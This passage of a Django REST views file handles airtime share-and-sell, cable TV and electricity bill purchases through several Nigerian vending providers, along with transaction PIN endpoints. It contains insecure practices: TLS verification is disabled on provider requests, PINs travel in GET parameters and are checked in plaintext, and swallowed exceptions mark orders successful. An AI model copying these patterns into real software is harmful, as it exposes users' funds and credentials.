                             status = 'successful'
                    elif Network.objects.get(name=net).share_and_sell_vending_medium =='SMS':
                            sendmessage('myweb',f"{user.username} want to buy  {amt} NAIRA  AIRTEL-SHARE AND SELL  to {num} ",f"{config.sms_notification_number}","02")

                    elif Network.objects.get(name=net).share_and_sell_vending_medium =='MSPLUG':
                             Msplug_AIRTIME_vending(net,amt,num,airtel_text.msplug_sim_slot,"SNS",airtel_text.msplug_device_id)
                             status = 'successful'
                    
                    elif Network.objects.get(name=net).share_and_sell_vending_medium  == "MSORG_DEVELOPED_WEBSITE":
                        msorg_sendairtime2(config.msorg_web_url,config.msorg_web_api_key,Network.objects.get(name=net).msorg_web_net_id,num,amt)
                        status = "successful"

                    elif Network.objects.get(name=net).share_and_sell_vending_medium  == "MSORG_DEVELOPED_WEBSITE_2":
                        msorg_sendairtime2(config.msorg_web_url_2,config.msorg_web_api_key_2,Network.objects.get(name=net).msorg_web2_net_id,num,amt)
                        status = "successful"

                    elif Network.objects.get(name=net).share_and_sell_vending_medium  == "MSORG_DEVELOPED_WEBSITE_3":
                        msorg_sendairtime2(config.msorg_web_url_3,config.msorg_web_api_key_3,Network.objects.get(name=net).msorg_web3_net_id,num,amt)
                        status = "successful"

                    elif Network.objects.get(name=net).share_and_sell_vending_medium =='SMEIFY':
                                     sendairtimesmeify("AIRTEL",amt,num,airtime_type)
                                     status = 'successful'
                    else:
                        errors['error'] = u'Share and sell not available on this network'
                        raise serializers.ValidationError(errors)

                elif net == '9MOBILE':
                    mobile_text = SME_text.objects.get(
                        network=Network.objects.get(name='9MOBILE'))

                    if Network.objects.get(name=net).share_and_sell_vending_medium ==  "SIMHOST":
                             senddata_ussdsimhost(f"*223*{mobile_text.share_and_sell_pin}*{amt}*{num}*#", mobile_text.sim_host_server_id_for_airtime, 'USSD')
                             status = 'successful'
                    elif Network.objects.get(name=net).share_and_sell_vending_medium =='VTUAUTO':
                             VTUAUTO_USSD(f"*223*{mobile_text.share_and_sell_pin}*{amt}*{num}*#",mobile_text.vtu_auto_device_id ,mobile_text.vtu_sim_slot)
                             status = 'successful'
                    elif Network.objects.get(name=net).share_and_sell_vending_medium =='SMS':
                            sendmessage('myweb',f"{user.username} want to buy  {amt} NAIRA  9MOBILE-SHARE AND SELL  to {num} ",f"{config.sms_notification_number}","02")


                    elif Network.objects.get(name=net).share_and_sell_vending_medium =='MSPLUG':
                             Msplug_AIRTIME_vending(net,amt,num,mobile_text.msplug_sim_slot,"SNS",mobile_text.msplug_device_id)
                             status = 'successful'
                    
                    elif Network.objects.get(name=net).share_and_sell_vending_medium  == "MSORG_DEVELOPED_WEBSITE":
                        msorg_sendairtime2(config.msorg_web_url,config.msorg_web_api_key,Network.objects.get(name=net).msorg_web_net_id,num,amt)
                        status = "successful"

                    elif Network.objects.get(name=net).share_and_sell_vending_medium  == "MSORG_DEVELOPED_WEBSITE_2":
                        msorg_sendairtime2(config.msorg_web_url_2,config.msorg_web_api_key_2,Network.objects.get(name=net).msorg_web2_net_id,num,amt)
                        status = "successful"

                    elif Network.objects.get(name=net).share_and_sell_vending_medium  == "MSORG_DEVELOPED_WEBSITE_3":
                        msorg_sendairtime2(config.msorg_web_url_3,config.msorg_web_api_key_3,Network.objects.get(name=net).msorg_web3_net_id,num,amt)
                        status = "successful"

                    elif Network.objects.get(name=net).share_and_sell_vending_medium =='SMEIFY':
                                     sendairtimesmeify("ETISALAT",amt,num,airtime_type)
                                     status = 'successful'
                    else:
                        errors['error'] = u'Share and sell not available on this network'
                        raise serializers.ValidationError(errors)

                elif net == 'GLO':
                    glo_text = SME_text.objects.get(network=Network.objects.get(name='GLO'))

                    if Network.objects.get(name=net).share_and_sell_vending_medium ==  "SIMHOST":
                             senddata_ussdsimhost(f"*131*{num}*{amt}*{glo_text.share_and_sell_pin}#", glo_text.sim_host_server_id_for_airtime, 'USSD')
                             status = 'successful'

                    elif Network.objects.get(name=net).share_and_sell_vending_medium  ==  "SIMHOST_NG":
                            senddata_simhostng(f"*131*{num}*{amt}*{glo_text.share_and_sell_pin}#", glo_text.sim_host_server_id_for_airtime,glo_text.vtu_sim_slot)#USSD

                            # sendairtime2("432",airtel_text.sim_host_server_id_for_airtime,airtel_text.vtu_sim_slot,f'2u {num} {amt} {airtel_text.vtu_pin}')   #SMS
                            status = 'successful'

                    elif Network.objects.get(name=net).share_and_sell_vending_medium =='VTUAUTO':
                             VTUAUTO_USSD(f"*131*{num}*{amt}*{glo_text.share_and_sell_pin}#",glo_text.vtu_auto_device_id ,glo_text.vtu_sim_slot)
                             status = 'successful'
                    elif Network.objects.get(name=net).share_and_sell_vending_medium =='SMS':
                            sendmessage('myweb',f"{user.username} want to buy  {amt} NAIRA   GLO-SHARE AND SELL  to {num} ",f"{config.sms_notification_number}","02")


                    elif Network.objects.get(name=net).share_and_sell_vending_medium =='MSPLUG':
                             Msplug_AIRTIME_vending(net,amt,num,glo_text.msplug_sim_slot,"SNS",glo_text.msplug_device_id)
                             status = 'successful'
                    
                    elif Network.objects.get(name=net).share_and_sell_vending_medium  == "MSORG_DEVELOPED_WEBSITE":
                        msorg_sendairtime2(config.msorg_web_url,config.msorg_web_api_key,Network.objects.get(name=net).msorg_web_net_id,num,amt)
                        status = "successful"

                    elif Network.objects.get(name=net).share_and_sell_vending_medium  == "MSORG_DEVELOPED_WEBSITE_2":
                        msorg_sendairtime2(config.msorg_web_url_2,config.msorg_web_api_key_2,Network.objects.get(name=net).msorg_web2_net_id,num,amt)
                        status = "successful"

                    elif Network.objects.get(name=net).share_and_sell_vending_medium  == "MSORG_DEVELOPED_WEBSITE_3":
                        msorg_sendairtime2(config.msorg_web_url_3,config.msorg_web_api_key_3,Network.objects.get(name=net).msorg_web3_net_id,num,amt)
                        status = "successful"

                    elif Network.objects.get(name=net).share_and_sell_vending_medium =='SMEIFY':
                                     sendairtimesmeify("GLO",amt,num,airtime_type)
                                     status = 'successful'
                    else:
                        errors['error'] = u'Share and sell not available on this network'
                        raise serializers.ValidationError(errors)

                else:

                    errors['error'] = u'Share and sell not available on this network currently'
                    raise serializers.ValidationError(errors)

#            try:
#                figure = TopupPercentage.objects.filter(network=net).first().commission
#                figure = float(amt) * figure
#                if figure > 0:
#                    if user.referer_username:
#                        if CustomUser.objects.filter(username__iexact = user.referer_username).exists():
#                            referer  = CustomUser.objects.get(username__iexact = user.referer_username)
#
#                            if  user.user_type == "Smart Earner":
#                                com =  referer.Referer_Bonus
#                                referer.ref_deposit(figure)
#
#                                Wallet_summary.objects.create(user= referer, product="[Referal bonus] you received N{} commission  from your referal {} Airtime Transaction".format(figure,user.username), amount = figure, previous_balance = com, after_balance= (com + figure))
#
#                                notify.send(referer, recipient=referer, verb="[Referal bonus] you received N{} commission from your referal {} Airtime Transaction".format(figure,user.username))
#
#            except:
#                pass

            try:
                sendmail("Order notification from www.yuniqtelecoms.com", f"Your order of {net} N{amt} AIRTIME on {num} as been placed sucessfully, and will be delivered shortly...", f"{user.email}", f"{user.username}")
            except:
                pass  
            
            serializer.save(Status=status, ident=ident, provider_source=provider_source, paid_amount=fund, medium='API',balance_before=previous_bal, balance_after=(previous_bal - amount))

            return Response(serializer.data, status=201)
        return Response(serializer.errors, status=400)



# Cable subscriptions api

class CableSubAPIView(APIView):
    permission_classes = (IsAuthenticated,)

    def get(self, request, id, format=None):
        try:
            item = Cablesub.objects.filter(user=request.user).get(pk=id)
            serializer = CablesubSerializer(item)
            return Response(serializer.data)
        except Cablesub.DoesNotExist:
            return Response(status=404)


class CableSubAPIListView(APIView):
    permission_classes = (IsAuthenticated,)

    def get(self, request, format=None):
        items = Cablesub.objects.filter(
            user=request.user).order_by('-create_date')
        paginator = PageNumberPagination()
        result_page = paginator.paginate_queryset(items, request)
        serializer = CablesubSerializer(result_page, many=True)
        return paginator.get_paginated_response(serializer.data)

    def post(self, request, format=None):
        status = "processing"
        fund = 0
        serializer = CablesubSerializer(
            data=request.data, context={'request': request})

        if serializer.is_valid():
            user = (serializer.validated_data["user"])
            order_username = (serializer.validated_data["user"])
            cableplan = serializer.validated_data["cableplan"]
            cable_name = serializer.validated_data["cablename"]
            num = serializer.validated_data["smart_card_number"]
            cable_plan = serializer.validated_data["cableplan"]
            smart_card_number = serializer.validated_data["smart_card_number"]
            previous_bal = user.Account_Balance
            plan_amount = float(cableplan.plan_amount)
            errors = {}

            service = ServicesCharge.objects.get(service="Cablesub")

            if user.user_type == "Affilliate":
                if service.Affilliate_charge > 0.0:
                    amount = float(plan_amount) +  float(service.Affilliate_charge)

                elif service.Affilliate_discount > 0.0:
                    amount = float(plan_amount) - (float(plan_amount) * service.Affilliate_discount/100)
                else:
                    amount = float(plan_amount)

            elif user.user_type == "TopUser":
                if service.topuser_charge > 0.0:
                    amount = float(plan_amount) + float(service.topuser_charge)

                elif service.topuser_discount > 0.0:
                    amount = float(plan_amount) - (float(plan_amount) * service.topuser_discount/100)
                else:
                    amount = float(plan_amount)

            elif user.user_type == "API":
                if service.api_charge > 0.0:
                    amount = float(plan_amount) + float(service.api_charge)

                elif service.api_discount > 0.0:
                    amount = float(plan_amount) - (float(plan_amount) * service.api_discount/100)

                else:
                    amount = float(plan_amount)
            else:

                if service.charge > 0.0:
                    amount = float(plan_amount) + float(service.charge)

                elif service.discount > 0.0:
                    amount = float(plan_amount) -  (float(plan_amount) * service.discount/100)

                else:
                    amount = float(plan_amount)

            def create_id():
                num = random.randint(1000, 4999)
                num_2 = random.randint(5000, 8000) 
                num_3 = random.randint(111, 999) * 2
                return str(Mdate.now().strftime("%Y%m%d%H%M%S")) + str(num) + str(num_2) + str(num_3) + str(uuid.uuid4())

            ident = create_id()


            if config.Cable_provider == "VTPASS":

                if str(cable_name) == 'DSTV':
 
                    authentication = (f'{config.vtpass_email}',
                                    f'{config.vtpass_password}')

                    payload = {"billersCode": smart_card_number, "serviceID": "dstv",
                            "request_id": ident, "variation_code": cableplan.product_code, "phone": user.Phone}

                    try:

                        check = user.withdraw(user.id, amount)
                        if check == False:
                            errors['error'] = u'Y insufficient balance '
                            raise serializers.ValidationError(errors)

                        Wallet_summary.objects.create(user= user, product="{}  N{} Cable tv Sub with {} ".format(cableplan.package, amount,smart_card_number), amount = amount, previous_balance = previous_bal, after_balance= (previous_bal - amount))
                        resp = requests.post("https://vtpass.com/api/pay", data=payload, auth=authentication)
                        status = 'successful'

                    except:
                        pass

                elif str(cable_name) == 'GOTV':
 
                    authentication = (f'{config.vtpass_email}',
                                    f'{config.vtpass_password}')

                    payload = {"billersCode": smart_card_number, "serviceID": "gotv",
                            "request_id": ident, "variation_code": cableplan.product_code, "phone": user.Phone}

                    try:

                        check = user.withdraw(user.id, amount)
                        if check == False:
                            errors['error'] = u' insufficient balance '
                            raise serializers.ValidationError(errors)
                        Wallet_summary.objects.create(user= user, product="{}  N{} Cable tv Sub with {} ".format(cableplan.package, amount,smart_card_number), amount = amount, previous_balance = previous_bal, after_balance= (previous_bal - amount))
                        resp = requests.post("https://vtpass.com/api/pay", data=payload, auth=authentication)
                        status = 'successful'

                    except:
                        pass

                elif str(cable_name) == 'STARTIME':
 
                    authentication = (f'{config.vtpass_email}',
                                    f'{config.vtpass_password}')

                    payload = {"billersCode": smart_card_number, "serviceID": "startimes",
                            "request_id": ident, "variation_code": cableplan.product_code, "phone": user.Phone}

                    try:

                        check = user.withdraw(user.id, amount)
                        if check == False:
                            errors['error'] = u'Y insufficient balance '
                            raise serializers.ValidationError(errors)
                        Wallet_summary.objects.create(user= user, product="{}  N{} Cable tv Sub with {} ".format(cableplan.package, amount,smart_card_number), amount = amount, previous_balance = previous_bal, after_balance= (previous_bal - amount))
                        resp = requests.post("https://vtpass.com/api/pay", data=payload, auth=authentication)
                        status = 'successful'

                    except:
                        pass

            
            elif config.Cable_provider == "RINGO":
                if str(cable_name) == 'DSTV':
                    url = "https://www.api.ringo.ng/api/agent/p2"
                    payload = {
                        "serviceCode" : "P-TV",
                        "type" : "DSTV",
                        "smartCardNo" : num,
                        "name" : cable_plan.package,
                        "code": cable_plan.product_code,
                        "period": "1",
                        "request_id": ident,
                        "hasAddon" : str(cable_plan.hasAddon),
                        "addondetails":
                            {
                        "name" : cable_plan.Addon_name,
                        "addoncode" : cable_plan.addoncode
                        }
                    }

                    headers = {'email': f'{config.ringo_email}','password': f'{config.ringo_password}','Content-Type': 'application/json' }
                    response = requests.request("POST", url, headers=headers, data = json.dumps(payload),verify=False)

                    try:
                        mb = CustomUser.objects.get(pk = order_username.pk)
                        check = mb.withdraw(mb.id, amount)
                        if check == False:
                            errors['error'] = u'Y insufficient balance '
                            raise serializers.ValidationError(errors)

                        response = requests.request("POST", url, headers=headers, data = json.dumps(payload),verify=False)

                    except:
                        pass


                    status = 'successful'



                elif str(cable_name) == 'GOTV':
                    #print(' ')
                    #print('sending GOTV cable to RINGO .............')

                    url = "https://www.api.ringo.ng/api/agent/p2"
                    payload = {
                        "serviceCode" : "P-TV",
                        "type" : "GOTV",
                        "smartCardNo" : num,
                        "name" : cable_plan.package,
                        "code": cable_plan.product_code,
                        "period": "1",
                        "request_id": ident,
                    }
                    payload = json.dumps(payload)
                    headers = {'email': f'{config.ringo_email}','password': f'{config.ringo_password}','Content-Type': 'application/json' }

                    # try:
                    mb = CustomUser.objects.get(pk = order_username.pk)
                    check = mb.withdraw(mb.id, amount)
                    if check == False:
                        errors['error'] = u'Y insufficient balance '
                        raise serializers.ValidationError(errors)

                    response = requests.request("POST", url, headers=headers, data = payload, verify=False)
                    #print(headers)
                    #print(payload)
                    #print(response.text)

                    status = 'successful'


                elif str(cable_name) == 'STARTIME':
                    url = "https://www.api.ringo.ng/api/agent/p2"
                    payload = {
                        "serviceCode" : "P-TV",
                        "type": "STARTIMES",
                        "smartCardNo" : num,
                        "request_id": ident,
                        "price": cable_plan.plan_amount
                    }

                    headers = {'email': f'{config.ringo_email}','password': f'{config.ringo_password}','Content-Type': 'application/json' }

                    # try:
                    mb = CustomUser.objects.get(pk = order_username.pk)
                    check = mb.withdraw(mb.id, amount)
                    if check == False:
                        errors['error'] = u'Y insufficient balance '
                        raise serializers.ValidationError(errors)

                    response = requests.request("POST", url, headers=headers, data = json.dumps(payload),verify=False)
                    #print(payload)
                    #print(response.text)

                    status = 'successful'


            elif config.Cable_provider == "MSORG WEB":
                mb = CustomUser.objects.get(pk = order_username.pk)
                check = mb.withdraw(mb.id, amount)
                cable_id = Cable.objects.get(name=cable_name).id

                if check == False:
                    errors['error'] = u'Y insufficient balance '
                    raise serializers.ValidationError(errors)
 
                url = f'{config.msorg_web_url}/api/cablesub/'

                headers = {
                    'Content-Type':'application/json',
                    'Authorization': f'Token {config.msorg_web_api_key}'
                }

                # param = { "cablename": cable_id,"cableplan":cable_plan.merchant_id,"smart_card_number":smart_card_number }
                param = { "cablename": cable_id,"cableplan":cable_plan.product_code,"smart_card_number":smart_card_number }

                param_data = json.dumps(param)
                response = requests.post(url, headers=headers, data=param_data, verify=False) 
                status = 'successful'

            else:   ## SMS NOTIFICATION


                check = user.withdraw(user.id, amount)
                if check == False:
                    errors['error'] = u'Y insufficient balance '
                    raise serializers.ValidationError(errors)

                Wallet_summary.objects.create(user= user, product="{}  N{} Cable tv Sub with {} ".format(cableplan.package, amount,smart_card_number), amount = amount, previous_balance = previous_bal, after_balance= (previous_bal - amount))

                def create_id():
                    num = random.randint(1, 10)
                    num_2 = random.randint(1, 10)
                    num_3 = random.randint(1, 10)
                    return str(num_2)+str(num_3)+str(uuid.uuid4())[:4]
                ident = create_id()


                def sendmessage_smartsms(sender,message,to,route):
                    payload={
                                'sender':sender,
                                'to': to,
                                'message': message,
                                'type': '0',
                                'routing':route,
                                'token': str(config.smartsms_api_token),
                                'schedule':'',
                            }

                    baseurl = 'https://smartsmssolutions.com/api/json.php?'
                    response = requests.post(baseurl, params=payload, verify=False)

                #### HOLLATAGS
                sendmessage('Msorg', f"{user.username} wants to purchase {cable_name} - {cableplan.package}  N{amount} Cable tv Sub with {smart_card_number}", '2348100148174', '03')
                status = 'successful'


            try:
               figure = cableplan.commission
               if figure > 0:
                   if user.referer_username:
                       if CustomUser.objects.filter(username__iexact = user.referer_username).exists():
                           referer  = CustomUser.objects.get(username__iexact = user.referer_username)

                           if  user.user_type == "Smart Earner":
                               com =  referer.Referer_Bonus
                               referer.ref_deposit(figure)

                               Wallet_summary.objects.create(user= referer, product="[Referal bonus] you received N{} commission  from your referal {} CableSub Transaction".format(figure,user.username), amount = figure, previous_balance = com, after_balance= (com + figure))

                               notify.send(referer, recipient=referer, verb="[Referal bonus] you received N{} commission from your referal {} CableSub Transaction".format(figure,user.username))

            except:
               pass



            try:
                sendmail("Order notification from www.yuniqtelecoms.com", f"Your order for {cable_name} Cable TV Subscription on {smart_card_number} as been placed sucessfully, and will be delivered shortly...", f"{user.email}", f"{user.username}")
            except:
                pass 

            serializer.save(Status=status, ident=ident, balance_before=previous_bal, balance_after=(previous_bal - amount), plan_amount=amount)

            return Response(serializer.data, status=201)
        return Response(serializer.errors, status=400)



class ValidateIUCAPIView(APIView):

    def get(self,request):
        iuc = request.GET.get('smart_card_number', None)
        cable_id = request.GET.get('cablename', None)

        if config.Cable_provider == "VTPASS":
            if cable_id == "DSTV":
                data = {"billersCode": iuc, "serviceID": "dstv"}

            elif cable_id == 'GOTV':
                data = {"billersCode": iuc, "serviceID": "gotv"}

            elif cable_id == "STARTIME" or cable_id == "STARTIMES":
                data = {"billersCode": iuc, "serviceID": "startimes"}

            invalid = False
            authentication = (f'{config.vtpass_email}', f'{config.vtpass_password}')

            resp = requests.post("https://vtpass.com/api/merchant-verify", data=data, auth=authentication)
            #print(resp.text)
            res = json.loads(resp.text)
            dat = res['content']
            if 'Customer_Name' in dat:
                name = res['content']['Customer_Name']
            else:
                invalid = True
                name = "INVALID IUC/SMARTCARD"

        else:
            url = "https://www.api.ringo.ng/api/agent/p2"
            payload = {
                "serviceCode" : "V-TV",
                "type" : cable_id,
                "smartCardNo" : iuc
            }

            #print(payload)

            headers = {'email': f'{config.ringo_email}','password': f'{config.ringo_password}','Content-Type': 'application/json' }

            response = requests.post(url, headers=headers, data = json.dumps(payload))
            #print(response.text)
            a = json.loads(response.text)

            if response.status_code == 200:
                    name = a["customerName"]
                    invalid = False
            else:
                name  = "INVALID_SMARTCARDNO"
                invalid = True

        data = {
            'invalid': invalid,
            'name': name
        }

        return Response(data)


class ValidateMeterAPIView(APIView):


    def get(self, request):

        meternumber = request.GET.get('meternumber', None)
        disconame = request.GET.get('disconame', None)
        mtype = request.GET.get('mtype', None)

        # disconame = Disco_provider_name.objects.get(id=disconame).name
        if config.Bill_provider == "VTPASS":
            #print(meternumber, disconame, mtype)

            if disconame == "Ikeja Electric":
                disconame = "ikeja-electric"

            elif disconame == 'Eko Electric':
                disconame = "eko-electric"

            elif disconame == "Kaduna Electric":
                disconame = "kaduna-electric"

            elif disconame == "Port Harcourt Electric":
                disconame = "portharcourt-electric"

            elif disconame == "Jos Electric":
                disconame = "jos-electric"

            elif disconame == "Ibadan Electric":
                disconame = "ibadan-electric"

            elif disconame == "Kano Electric":
                disconame = "kano-electric"

            elif disconame == "Abuja Electric":
                disconame = "abuja-electric"

            invalid = False
            data = {"billersCode": meternumber,"serviceID": disconame, "type": mtype}
            authentication = (f'{config.vtpass_email}',f'{config.vtpass_password}')

            resp = requests.post("https://vtpass.com/api/merchant-verify", data=data, auth=authentication)
            res = json.loads(resp.text)
            dat = res['content']
            if 'Customer_Name' in dat:
                name = res['content']['Customer_Name']
                address = res['content']["Address"]
            else:
                invalid = True
                name = "INVALID METER NUMBER"
                address = "INVALID METER NUMBER"
        else:
            invalid = False
            name = "NO NAME RETURN"
            address = False

            #print("hello")
            #print(disconame)

            url = "https://www.api.ringo.ng/api/agent/p2"
            payload = {
            "serviceCode" : "V-ELECT",
            "disco" :Disco_provider_name.objects.get(name = disconame).p_id,
            "meterNo": meternumber,
            "type" : mtype
            }

            #print(payload)

            headers = {'email': f'{config.ringo_email}','password': f'{config.ringo_password}','Content-Type': 'application/json' }

            response = requests.post(url, headers=headers, data = json.dumps(payload))
            #print(response.text)
            a = json.loads(response.text)

            status  = a["status"]

            if status == '200':
                name = a["customerName"]
                invalid = False
            else:
                name  = "NO NAME RETURN"
                invalid = True

        data = {
            'invalid': invalid,
            'name': name,
            'address': address
        }

        return Response(data)



class BillPaymentAPIView(APIView):
    permission_classes = (IsAuthenticated,)

    def get(self, request, id, format=None):
        try:
            item = Billpayment.objects.filter(user=request.user).get(pk=id)
            serializer = BillpaymentSerializer(item)
            return Response(serializer.data)
        except Billpayment.DoesNotExist:
            return Response(status=404)


class BillPaymentAPIListView(APIView):
    permission_classes = (IsAuthenticated,)

    def get(self, request, format=None):
        items = Billpayment.objects.filter(user=request.user).order_by('-create_date')
        paginator = PageNumberPagination()
        result_page = paginator.paginate_queryset(items, request)
        serializer = BillpaymentSerializer(result_page, many=True)
        return paginator.get_paginated_response(serializer.data)

    def post(self, request, format=None):
        status = "processing"
        fund = 0
        serializer = BillpaymentSerializer(data=request.data, context={'request': request})

        if serializer.is_valid():
            user = (serializer.validated_data["user"])
            meter_number = serializer.validated_data["meter_number"]
            mtype = serializer.validated_data["MeterType"]
            disco_name = serializer.validated_data["disco_name"]
            amount = serializer.validated_data["amount"]
            number = serializer.validated_data["Customer_Phone"]
            previous_bal = user.Account_Balance
            token = ""
            errors = {}

            service = ServicesCharge.objects.get(service="Bill")

            if user.user_type == "Affilliate":
                if service.Affilliate_charge > 0.0:
                    paid_amount = float(amount) + float(service.Affilliate_charge)

                elif service.Affilliate_discount > 0.0:
                    paid_amount = float(
                        amount) - (float(amount) * service.Affilliate_discount/100)
                else:
                    paid_amount = float(amount)

            elif user.user_type == "TopUser":
                if service.topuser_charge > 0.0:
                    paid_amount = float(amount) + float(service.topuser_charge)

                elif service.topuser_discount > 0.0:
                    paid_amount = float(
                        amount) - (float(amount) * service.topuser_discount/100)
                else:
                    paid_amount = float(amount)
            elif user.user_type == "API":
                if service.api_charge > 0.0:
                    paid_amount = float(amount) + float(service.api_charge)

                elif service.api_discount > 0.0:
                    paid_amount = float(
                        amount) - (float(amount) * service.api_discount/100)

                else:
                    paid_amount = float(amount)
            else:

                if service.charge > 0.0:
                    paid_amount = float(amount) + float(service.charge)

                elif service.discount > 0.0:
                    paid_amount = float(amount) -(float(amount) * service.discount/100)

                else:
                    paid_amount = float(amount)

            def create_id():
                num = random.randint(1000, 4999)
                num_2 = random.randint(5000, 8000) 
                num_3 = random.randint(111, 999) * 2
                return str(Mdate.now().strftime("%Y%m%d%H%M%S")) + str(num) + str(num_2) + str(num_3) + str(uuid.uuid4())

            ident = create_id()


            check = user.withdraw(user.id, paid_amount)
            if check == False:
                errors['error'] = u'Y insufficient balance '
                raise serializers.ValidationError(errors)

            Wallet_summary.objects.create(user=user, product="{}  N{} Electricity Bill Payment  with {} ".format(
                disco_name.name, amount, meter_number), amount=paid_amount, previous_balance=previous_bal, after_balance=(previous_bal - paid_amount))

            if config.Bill_provider == "VTPASS":

                if disco_name.name == "Ikeja Electric":
                    disconame = "ikeja-electric"

                elif disco_name.name == 'Eko Electric':
                    disconame = "eko-electric"

                elif disco_name.name == "Kaduna Electric":
                    disconame = "kaduna-electric"

                elif disco_name.name == "Port Harcourt Electric":
                    disconame = "portharcourt-electric"

                elif disco_name.name == "Jos Electric":
                    disconame = "jos-electric"

                elif disco_name.name == "Ibadan Electric":
                    disconame = "ibadan-electric"

                elif disco_name.name == "Kano Electric":
                    disconame = "kano-electric"

                elif disco_name.name == "Abuja Electric":
                    disconame = "abuja-electric"

                authentication = (f'{config.vtpass_email}', f'{config.vtpass_password}')
                payload = {"billersCode": meter_number, "amount": amount, "serviceID": disconame,"request_id": ident, "variation_code": mtype, "phone": number, }
                response = requests.post("https://vtpass.com/api/pay", data=payload, auth=authentication)
                #print(response.text)
                try:
                    if response.status_code == 200 or response.status_code == 201:
                        status = 'successful'
                        a = json.loads(response.text)
                        token = a["purchased_code"]

                    else:
                        payload = {'request_id': ident}

                        response = requests.post("https://vtpass.com/api/requery", data=payload, auth=authentication)
                        status = 'successful'
                        a = json.loads(response.text)
                        token = a["purchased_code"]

                except:
                    pass

            elif config.Bill_provider == "MSORG WEB":
                url =f"{config.msorg_web_url}/api/billpayment/"
                headers = {
                    'Content-Type':'application/json',
                    'Authorization': f'Token {config.msorg_web_api_key}'
                    }
                param = param = param = { "disco_name": disco_name.p_id, "amount": amount, "Customer_Phone": number, "meter_number": meter_number,  "MeterType": mtype  }
                param_data = json.dumps(param)
                response = requests.post(url, headers=headers, data=param_data, verify=False)
                
                try:
                    status = 'successful'
                    a = json.loads(response.text)
                    token = a["token"]
                except:
                    pass

            else:
                url = "https://www.api.ringo.ng/api/agent/p2"
                payload = {
                            "serviceCode" : "P-ELECT",
                            "disco" : disco_name.p_id,
                            "meterNo": meter_number,
                            "type" :  mtype.upper(),
                            "amount": amount,
                            "phonenumber":number,
                            "request_id" : ident
                            }
                headers = {'email': f'{config.ringo_email}','password': f'{config.ringo_password}','Content-Type': 'application/json' }

                response = requests.post(url, headers=headers, data = json.dumps(payload))

                try:
                    if response.status_code == 200 or response.status_code == 201:
                        a = json.loads(response.text)
                        token = a["token"]
                        status = 'successful'

                    else:
                        url = "https://www.api.ringo.ng//api/b2brequery"
                        payload = {'request_id': ident}
                        headers = {'email': f'{config.ringo_email}','password': f'{config.ringo_password}','Content-Type': 'application/json' }

                        response = requests.post(url, headers=headers, data = json.dumps(payload))

                        # #print(payload)
                        # #print(response.text)
                        a = json.loads(response.text)
                        token = a["token"]
                        status = 'successful'

                except:
                    pass


#            try:
#                figure = disco_name.commission
#                if figure > 0:
#                    if user.referer_username:
#                        if CustomUser.objects.filter(username__iexact = user.referer_username).exists():
#                            referer  = CustomUser.objects.get(username__iexact = user.referer_username)
#
#                            if  user.user_type == "Smart Earner":
#                                com =  referer.Referer_Bonus
#                                referer.ref_deposit(figure)
#
#                                Wallet_summary.objects.create(user= referer, product="[Referal bonus] you received N{} commission  from your referal {} BillPayment Transaction".format(figure,user.username), amount = figure, previous_balance = com, after_balance= (com + figure))
#
#                                notify.send(referer, recipient=referer, verb="[Referal bonus] you received N{} commission from your referal {} BillPayment Transaction".format(figure,user.username))
#
#            except:
#                pass

            try:
                sendmail("Order notification from www.yuniqtelecoms.com", f"Your order of Electricity Bill Payment for {disco_name.name}({mtype}) on {meter_number} as been placed sucessfully, and will be delivered shortly...", f"{user.email}", f"{user.username}")
            except:
                pass 
            
            serializer.save(Status=status, token=token, ident=ident, balance_before=previous_bal, balance_after=(previous_bal - float(amount)), paid_amount=paid_amount)

            return Response(serializer.data, status=201)
        return Response(serializer.errors, status=400)




class PINCCHECKAPIView(APIView):
    permission_classes = (IsAuthenticated,)

    def get(self, request, format=None):
        pin = request.GET.get('pin', None)
        #print(pin)
        #print(request.user.pin)

        if pin != str(request.user.pin):
            return Response({"error": "  Incorrect pin"}, status=400)

        else:
            data = {"message": "pin correct"}

        return Response(data, status=200)


class PINCHANGEAPIView(APIView):
    permission_classes = (IsAuthenticated,)

    def get(self, request, format=None):
        pin1 = request.GET.get('pin1', None)
        pin2 = request.GET.get('pin2', None)
        oldpin = request.GET.get('oldpin', None)
        #print(oldpin)
        #print(request.user.pin)
        if oldpin != str(request.user.pin):
            return Response({"error": "Old pin is incorrect"}, status=400)

        elif pin1 != pin2:
            return Response({"error": "Two Fields are not match"}, status=400)

        elif len(str(pin1)) > 5 or len(str(pin1)) < 5:
            return Response({"error": "Your pin must be 5 digit in length"}, status=400)

        elif len(str(pin2)) > 5 or len(str(pin2)) < 5:
            return Response({"error": "Your pin must be 5 digit in length"}, status=400)

        elif pin1.isdigit() != True and pin2.isdigit() != True:
            return Response({"error": "The pin must be Digit"}, status=400)

        elif oldpin == str(request.user.pin):
            return Response({"error": "The old pin must not be the same as the new pin"}, status=400)

        else:
            request.user.pin = pin1
            request.user.save()
            data = {"message": "pin Changed successfully"}

        return Response(data, status=200)


class PINRESETAPIView(APIView):
    permission_classes = (IsAuthenticated,)

    def get(self, request, format=None):
        pin1 = request.GET.get('pin1', None)
        pin2 = request.GET.get('pin2', None)
        password = request.GET.get('password', None)
        #print(password)
        #print(request.user.password)
        if not request.user.check_password(password):
            return Response({"error": "incorrect password"}, status=400)

        elif pin1 != pin2:
            return Response({"error": "pin1 and pin2  are not match"}, status=400)

        elif len(str(pin1)) > 5 or len(str(pin1)) < 5:
            return Response({"error": "Your pin must be 5 digit in length"}, status=400)

        elif len(str(pin2)) > 5 or len(str(pin2)) < 5:
            return Response({"error": "Your pin must be 5 digit in length"}, status=400)

        elif pin1.isdigit() != True and pin2.isdigit() != True:
            return Response({"error": "The pin must be Digit"}, status=400)

        else:
            request.user.pin = pin1
            request.user.save()
            data = {"message": "pin Reset successfully"}

        return Response(data, status=200)


class PINSETUPAPIView(APIView):
    permission_classes = (IsAuthenticated,)

    def get(self, request, format=None):
        pin1 = request.GET.get('pin1', None)
        pin2 = request.GET.get('pin2', None)

        if pin1 != pin2:
            return Response({"error": "Two Fields are not match"}, status=400)

        elif len(str(pin1)) > 5 or len(str(pin1)) < 5:
            return Response({"error": "Your pin must be 5 digit in length"}, status=400)

        elif len(str(pin2)) > 5 or len(str(pin2)) < 5:
            return Response({"error": "Your pin must be 5 digit in length"}, status=400)

        elif pin1.isdigit() != True and pin2.isdigit() != True:
            return Response({"error": "The pin must be Digit"}, status=400)

        else:
            request.user.pin = pin1
            request.user.save()
            data = {"message": "pin setup successfully"}

        return Response(data, status=200)


class CouponPaymentAPIView(APIView):
    permission_classes = (IsAuthenticated,)

    def get(self, request, format=None):
        items = CouponPayment.objects.filter(
            user=request.user).order_by('-create_date')
